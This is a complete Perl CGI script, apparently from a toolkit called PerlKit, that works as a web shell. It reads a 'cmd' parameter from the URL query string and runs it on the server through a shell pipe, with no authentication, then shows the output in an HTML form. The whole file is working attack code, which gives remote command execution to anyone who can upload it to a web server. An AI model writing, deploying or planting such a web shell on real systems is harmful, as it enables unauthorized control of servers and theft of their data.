#!/usr/bin/perl
#
# PerlKit-0.1 - http://www.t0s.org
#
# cmd.pl: Run commands on a webserver

use strict;

my ($cmd, %FORM);

$|=1;

print "Content-Type: text/html\r\n";
print "\r\n";

# Get parameters

%FORM = parse_parameters($ENV{'QUERY_STRING'});

if(defined $FORM{'cmd'}) {
  $cmd = $FORM{'cmd'};
}

print '<HTML>
<body>
<form action="" method="GET">
<input type="text" name="cmd" size=45 value="' . $cmd . '">
<input type="submit" value="Run">
</form>
<pre>';

if(defined $FORM{'cmd'}) {
  print "Results of '$cmd' execution:\n\n";
  print "-"x80;
  print "\n";

  open(CMD, "($cmd) 2>&1 |") || print "Could not execute command";

  while(<CMD>) {
    print;
  }

  close(CMD);
  print "-"x80;
  print "\n";
}

print "</pre>";

sub parse_parameters ($) {
  my %ret;

  my $input = shift;

  foreach my $pair (split('&', $input)) {
    my ($var, $value) = split('=', $pair, 2);
    
    if($var) {
      $value =~ s/\+/ /g ;
      $value =~ s/%(..)/pack('c',hex($1))/eg;

      $ret{$var} = $value;
    }
  }

  return %ret;
}
